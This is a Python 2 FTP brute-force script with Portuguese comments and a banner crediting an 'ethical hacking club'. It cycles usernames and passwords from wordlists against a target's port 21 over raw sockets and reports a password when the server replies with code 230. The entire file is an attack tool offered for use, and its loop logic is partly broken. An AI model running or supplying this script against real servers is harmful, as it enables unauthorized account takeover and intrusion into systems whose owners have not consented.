#!/usr/bin/python

import socket
import re
import sys
import os
import time


print """

 _                _            __                         __ _
| |__  _ __ _   _| |_ ___     / _| ___  _ __ ___ ___     / _| |_ _ __
| '_ \| '__| | | | __/ _ \   | |_ / _ \| '__/ __/ _ \   | |_| __| '_ \
| |_) | |  | |_| | ||  __/   |  _| (_) | | | (_|  __/   |  _| |_| |_) |
|_.__/|_|   \__,_|\__\___|___|_|  \___/|_|  \___\___|___|_|  \__| .__/
                        |_____|                    |_____|      |_|

	--[code by : 33Divace - LDEHC - (LionsDefender Ethical Hacking Club)
	--[date 9/04/2018


"""
if len(sys.argv) !=4:
            print 'USA: python ftp_brute_force.py 192.168.0.3 user.txt pass.txt'  
            sys.exit(0)

time.sleep(0.2)
#Entrea com a lua lista de senhas e usuarios
fuser = open(sys.argv[2])
fpass = open(sys.argv[3])
print '[*]Connectando-se no Alvo...[*]'
time.sleep(1)
print '[*]Iniciando o Brute Force [*]'
time.sleep(1)
print '[+]Brute force FTP em Andamento[+]\n'
time.sleep(1)
#pega os usuarios do arquivo e teste eles,o mesmo com as senhas
for linha in fuser.readlines():

        for linha1 in fpass.readlines():


                print "Testando Com Usuario:==>",linha,"Com a senha:==>",linha1

                ftp_b = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                ftp_b.connect((sys.argv[1],21))

                ftp_b.recv(2048)

                ftp_b.send("USER "+linha+"\r\n")

                ftp_b.recv(2048)

                ftp_b.send("PASS "+linha1+"\r\n")

                resul = ftp_b.recv(2048)

                ftp_b.send("QUIT\r\n")


                if re.search("230",resul):

                        print '[*] [EHC] Senha Encontrada [EHC] [*]:==>key:',linha1
                        print "Conseguiste a senha seja feliz"
                        print '[+]Hacker LionsDefender(EHC)[+]'
                        os.system('whoami')
                        break

                else:

                        print "[$] Senha Incorreta [$]"
